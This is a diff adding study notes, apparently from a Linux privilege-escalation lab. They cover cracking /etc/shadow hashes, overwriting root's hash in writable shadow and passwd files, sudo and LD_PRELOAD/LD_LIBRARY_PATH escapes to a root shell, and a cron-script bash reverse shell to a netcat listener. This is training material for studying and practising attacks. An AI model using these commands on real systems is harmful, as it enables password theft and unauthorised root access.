@@ -1,1 +1,145 @@
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Weak File Permissions - Readable /etc/shadow
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+    ls -l /etc/shadow
+
+View the contents of the /etc/shadow file:
+
+    cat /etc/shadow
+
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+
+Save the root user's hash to a file called hash.txt & use john the ripper to crack it.
+
+    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Switch to the root user, using the cracked password:
+
+  su root
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Weak File Permissions - Writable /etc/shadow      
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+    ls -l /etc/shadow
+
+Generate a new password hash with a password of your choice:
+
+    mkpasswd -m sha-512 [new-passphrase]
+
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+
+    nano /etc/shadow
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Weak File Permissions - Writable /etc/passwd
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. 
+Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
+
+NOTE: that the /etc/passwd file is world-writable:
+
+    ls -l /etc/passwd
+
+Generate a new password hash with a password of your choice:
+
+    openssl passwd [newpassword]
+
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+
+Switch to the root user, using the new password:
+
+    su root
+
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing 
+the generated password hash between the first and second colon (replacing the "x").
+
+Now switch to the newroot user, using the new password:
+
+  su newroot
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Sudo - Shell Escape Sequences
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+List the programs which sudo allows your user to run:
+
+    sudo -l
+
+Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to 
+elevate privileges, usually via an escape sequence.
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+ Sudo - Environment Variables
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Sudo can be configured to inherit certain environment variables from the user's environment.
+     Check which environment variables are inherited (look for the env_keep options):
+
+        sudo -l
+
+LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. 
+      LD_PRELOAD loads a shared object before any others when a program is run. 
+      LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
+
+Create a shared object using the code located at "/home/user/tools/sudo/preload.c"
+
+      gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+
+Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path 
+of the new shared object:
+
+      sudo LD_PRELOAD=/tmp/preload.so [program-name-here]
+
+A root shell should spawn!!!!
+-------------------------------------------------------
+also
+-------------------------------------------------------
+Run ldd against the apache2 program file to see which shared libraries are used by the program:
+
+      ldd /usr/sbin/apache2
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
+
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+
+Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
+
+sudo LD_LIBRARY_PATH=/tmp apache2
+
+A root shell should spawn
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Cron Jobs - File Permissions
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for 
+cron jobs. The system-wide crontab is located at /etc/crontab.
+
+View the contents of the system-wide crontab:
+
+      cat /etc/crontab
+
+There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+
+Locate the full path of the overwrite.sh file:
+
+locate overwrite.sh
+
+Note that the file is world-writable:
+
+ls -l /usr/local/bin/overwrite.sh
+
+Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
+
+nc -nvlp 4444
+
+Remember to exit out of the root shell and remove the reverse shell code before continuing!
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
